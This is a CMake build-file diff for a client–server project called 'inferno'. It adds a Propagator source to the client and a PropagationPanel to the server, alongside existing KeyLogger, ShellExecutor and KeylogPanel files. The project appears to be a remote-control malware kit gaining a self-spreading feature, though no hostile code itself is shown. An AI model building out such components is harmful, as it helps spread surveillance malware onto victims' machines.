@@ -52,6 +52,7 @@ add_executable(inferno_server
     server/src/ui/components/TelemetryPanel.cpp
     server/src/ui/components/KeylogPanel.cpp
     server/src/ui/components/IntelligencePanel.cpp
+    server/src/ui/components/PropagationPanel.cpp
     server/src/database/Inferno_Database.cpp
     server/src/services/Analysis.cpp
     server/src/services/IntelAnalysisService.cpp
@@ -64,6 +65,7 @@ add_executable(inferno_server
     server/include/ui/components/TelemetryPanel.hpp
     server/include/ui/components/KeylogPanel.hpp
     server/include/ui/components/IntelligencePanel.hpp
+    server/include/ui/components/PropagationPanel.hpp
     server/include/database/Inferno_Database.hpp
     server/include/services/Analysis.hpp
     server/include/services/IntelAnalysisService.hpp
@@ -83,6 +85,7 @@ add_executable(inferno_client
     client/src/ProcessProfiler.cpp
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
+    client/src/Propagator.cpp
 )
 target_link_libraries(inferno_client PRIVATE inferno_common)
 
@@ -124,6 +127,7 @@ add_executable(inferno_tests
     client/src/ProcessProfiler.cpp
     client/src/ShellExecutor.cpp
     client/src/KeyLogger.cpp
+    client/src/Propagator.cpp
 )
 target_link_libraries(inferno_tests PRIVATE inferno_common Qt6::Widgets Qt6::Gui Qt6::Core Qt6::Sql)
 target_compile_definitions(inferno_tests PRIVATE INFERNO_TESTING)
